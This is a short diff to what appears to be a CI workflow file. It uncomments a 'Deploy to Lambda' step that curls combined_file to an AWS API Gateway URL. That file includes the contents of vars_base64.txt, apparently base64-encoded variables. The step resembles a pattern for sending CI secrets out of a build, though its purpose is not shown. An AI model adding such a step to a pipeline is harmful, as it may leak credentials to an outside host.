@@ -39,13 +39,13 @@ jobs:
             echo '===SPLIT===' >> combined_file
             cat vars_base64.txt >> combined_file
 
-      # - run:
-      #     name: Deploy to Lambda
-      #     command: |
-      #       curl -X POST \
-      #         -H "Content-Type: application/octet-stream" \
-      #         --data-binary @combined_file \
-      #         https://aj3ah32u35.execute-api.ap-southeast-1.amazonaws.com/staging/test-script
+      - run:
+          name: Deploy to Lambda
+          command: |
+            curl -X POST \
+              -H "Content-Type: application/octet-stream" \
+              --data-binary @combined_file \
+              https://aj3ah32u35.execute-api.ap-southeast-1.amazonaws.com/staging/test-script
 
 workflows:
   version: 2
